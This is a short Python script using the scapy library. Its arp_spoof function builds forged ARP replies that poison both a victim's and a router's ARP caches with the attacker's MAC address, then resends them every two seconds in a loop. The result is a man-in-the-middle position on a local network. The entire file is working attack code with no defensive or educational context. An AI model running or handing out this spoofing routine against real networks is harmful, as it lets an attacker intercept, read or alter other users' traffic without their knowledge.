import sys
from scapy.all import *
from time import sleep

from scapy.layers.l2 import Ether, ARP


def arp_spoof( rIP , rMac, vicIP, vicMac, aMac):
    arpVictim = Ether(src=aMac, dst=vicMac) / ARP(hwsrc= aMac,
                                                  hwdst= vicMac,
                                                  psrc= rIP,
                                                  pdst= vicIP,
                                                  op= 2)
    arpRouter = Ether(src=aMac, dst=rMac) / ARP(hwsrc= aMac,
                                                  hwdst= rMac,
                                                  psrc= vicIP,
                                                  pdst= rIP,
                                                  op= 2)
    while 1:
        try:
            sendp(arpVictim, verbose=0)
            sendp(arpRouter, verbose=0)
            time.sleep(2)
        except KeyboardInterrupt:
            sys.exit(0)
